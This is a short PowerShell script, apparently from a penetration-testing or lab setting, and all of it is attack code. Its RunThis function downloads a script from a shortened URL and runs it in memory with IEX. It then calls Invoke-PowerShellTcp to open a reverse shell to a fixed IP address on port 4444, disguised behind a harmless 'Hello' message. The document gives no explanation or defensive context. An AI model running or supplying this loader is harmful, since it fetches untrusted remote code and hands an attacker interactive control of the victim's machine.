function RunThis(){
    $wc = New-Object System.Net.Webclient
    IEX $wc.DownloadString("https://bit.ly/1RJwIiD")
    Invoke-PowerShellTcp -Reverse -IPAddress 10.13.250.113 -Port 4444
}

Write-Host "Hello"
RunThis
